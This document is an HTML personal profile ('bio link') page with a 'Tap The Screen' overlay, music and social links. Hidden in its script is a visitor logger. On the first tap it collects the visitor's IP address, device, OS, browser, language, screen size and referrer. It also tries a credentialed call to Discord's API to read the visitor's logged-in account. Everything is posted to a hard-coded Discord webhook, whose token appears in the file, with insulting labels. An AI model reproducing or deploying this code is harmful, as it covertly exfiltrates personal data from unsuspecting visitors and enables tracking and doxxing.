<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><----></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        dark: '#0a0a0f',
                        card: '#16161f',
                        accent: '#9945ff',
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .content-auto {
                content-visibility: auto;
            }
            .glow {
                box-shadow: 0 0 20px rgba(153, 69, 255, 0.3);
            }
            .text-glow {
                text-shadow: 0 0 8px rgba(153, 69, 255, 0.5);
            }
        }

        body {
            background: linear-gradient(to bottom, #000000, #1a0505);
            min-height: 100vh;
        }

        /* ✅ Inayos na overlay background */
        #blahOverlay {
            position: fixed;
            inset: 0;
            background: #000000 url("https://i.imgur.com/3sQn9jR.gif") center / contain no-repeat;
            background-color: #000000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 1;
            transition: opacity 0.8s ease;
            pointer-events: none;
        }

        /* ✅ Pixelated style + maliit na laki */
        #blahText {
            font-size: clamp(1.4rem, 5vw, 2rem);
            font-weight: bold;
            color: #ffffff;
            font-family: 'Courier New', Courier, monospace;
            text-shadow: 0 0 2px #fff, 0 0 4px #fff;
            image-rendering: pixelated;
            letter-spacing: 2px;
            -webkit-font-smoothing: none;
            -moz-osx-font-smoothing: grayscale;
        }

        .fade-out {
            opacity: 0 !important;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen text-white p-4">

    <!-- ✅ Overlay Screen -->
    <div id="blahOverlay">
        <div id="blahText">Tap The Screen</div>
    </div>

    <!-- Main Card -->
    <div class="bg-card/80 backdrop-blur-md rounded-3xl p-8 w-full max-w-md glow border border-gray-800">
        <!-- Profile Picture -->
        <div class="flex justify-center mb-6">
            <div class="w-32 h-32 rounded-full overflow-hidden border-2 border-accent/60">
                <img src="https://i.imgur.com/M630Z7k.gif" alt="Profile" class="w-full h-full object-cover">
            </div>
        </div>

        <!-- Badges/Icons -->
        <div class="flex justify-center gap-3 mb-6">
            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">☠️</span>
            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">⚜️</span>
            <span class="bg-gray-800 px-3 py-1 rounded-full text-sm font-bold">PR$K</span>
        </div>

        <!-- Custom Text -->
        <div class="bg-gray-800/60 rounded-xl py-3 mb-8">
            <p class="text-center text-gray-300 italic">Be Better</p>
        </div>

        <!-- Username Section -->
        <div class="flex items-center gap-3 mb-6">
            <div class="w-10 h-10 rounded-full bg-gray-700 overflow-hidden">
                <img src="https://i.imgur.com/KGPggfn.jpeg" alt="Avatar" class="w-full h-full object-cover">
            </div>
            <div>
                <p class="font-bold text-lg">BLAH<span class="text-sm text-gray-400">⚡ PR$K</span></p>
                <p class="text-sm text-gray-400">EMPTY.</p>
            </div>
        </div>

        <!-- Status Text -->
        <p class="text-center text-gray-400 text-sm mb-8">the world is your.</p>

        <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
            <i class="fa-brands fa-discord"></i>
        </a>
        <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
            <i class="fa-brands fa-github"></i>
        </a>

        <!-- Footer -->
        <div class="flex justify-between items-center mt-4 text-gray-400 text-sm">
            <span class="flex items-center gap-2">
                <span class="text-purple-500">⦿</span> 1337
            </span>
            <span>on</span>
        </div>
    </div>

    <!-- Background Sound -->
    <audio id="bgSound" loop preload="auto">
        <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3" type="audio/mpeg">
    

    <script>
        const audio = document.getElementById('bgSound');
        audio.volume = 0.4;

        // ✅ Webhook link mo
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";

        // ✅ Pag tap sa screen
        document.addEventListener('click', () => {
            audio.play().catch(err => console.log("Audio error:", err));

            const overlay = document.getElementById('blahOverlay');
            setTimeout(() => overlay.classList.add('fade-out'), 100);

            sendVisitorInfo();
        }, { once: true });

        // ✅ Logger function - pareho ng dati
        async function sendVisitorInfo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const visitorIP = ipData.ip;

                const ua = navigator.userAgent;
                const lang = navigator.language || navigator.userLanguage;
                const langFull = new Intl.DisplayNames(['en'], { type: 'language' }).of(lang) || lang;

                let browser = "Unknown";
                if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
                else if (ua.includes("Firefox")) browser = "Firefox";
                else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
                else if (ua.includes("Edg")) browser = "Edge";
                else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";

                let device = "Android Device";
                let os = "Android 10";

                if (ua.includes("Android")) {
                    const osMatch = ua.match(/Android\s([0-9.]+)/);
                    if (osMatch) os = `Android ${osMatch[1]}`;

                    if (ua.includes("SM-")) {
                        const model = ua.match(/SM-[A-Z0-9]+/);
                        device = model ? `Samsung ${model[0]}` : "Samsung";
                    } else if (ua.includes("CPH")) {
                        const model = ua.match(/CPH[0-9]+/);
                        device = model ? `Oppo ${model[0]}` : "Oppo";
                    } else if (ua.includes("Redmi")) {
                        const model = ua.match(/Redmi\s?[0-9A-Z]+/);
                        device = model ? `Xiaomi ${model[0]}` : "Xiaomi Redmi";
                    } else if (ua.includes("POCO")) {
                        const model = ua.match(/POCO\s?[0-9A-Z]+/);
                        device = model ? `Xiaomi ${model[0]}` : "Xiaomi POCO";
                    } else if (ua.includes("Vivo")) {
                        const model = ua.match(/V[0-9]+/);
                        device = model ? `Vivo ${model[0]}` : "Vivo";
                    } else if (ua.includes("Infinix")) {
                        const model = ua.match(/X[0-9]+/);
                        device = model ? `Infinix ${model[0]}` : "Infinix";
                    } else if (ua.includes("Tecno")) {
                        const model = ua.match(/KI[0-9]+/);
                        device = model ? `Tecno ${model[0]}` : "Tecno";
                    } else if (ua.includes("Realme")) {
                        const model = ua.match(/RMX[0-9]+/);
                        device = model ? `Realme ${model[0]}` : "Realme";
                    }
                } else if (ua.includes("iPhone")) {
                    device = "Apple iPhone";
                    const iosMatch = ua.match(/iPhone OS\s([0-9_]+)/);
                    os = iosMatch ? `iOS ${iosMatch[1].replace("_", ".")}` : "iOS";
                } else if (ua.includes("Windows")) {
                    device = "Windows PC";
                    const winMatch = ua.match(/Windows NT\s([0-9.]+)/);
                    os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
                }

                let accountInfo = "Walang naka-detect na Discord account";
                try {
                    const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
                        method: "GET",
                        credentials: "include",
                        headers: { "Accept": "application/json" }
                    });
                    if (discordRes.ok) {
                        const userData = await discordRes.json();
                        accountInfo = `✅ Username: @${userData.username}\n🆔 ID: ${userData.id}\n🔗 Profile: https://discord.com/users/${userData.id}`;
                    }
                } catch (err) {
                    accountInfo = "Walang naka-detect na Discord account";
                }

                const payload = {
                    username: "BOBO KA TOL",
                    avatar_url: "https://i.imgur.com/ZmspxIl.png",
                    embeds: [{
                        title: "BLAH WAS HERE",
                        color: 1003621,
                        fields: [
                            { name: "IP ADDRESS", value: visitorIP, inline: false },
                            { name: "DEVICE", value: device, inline: true },
                            { name: "OPERATING SYSTEM", value: os, inline: true },
                            { name: "BROWSER", value: browser, inline: true },
                            { name: "TANGA PUTA", value: langFull, inline: true },
                            { name: "HULE", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
                            { name: "GINANON LANG", value: document.referrer || "Direktang binuksan", inline: false },
                            { name: "ACCOUNT", value: accountInfo, inline: false }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: { text: "Logger ni BLAH" }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.log("Error:", err);
            }
        }
    </script>
</body>
</html>
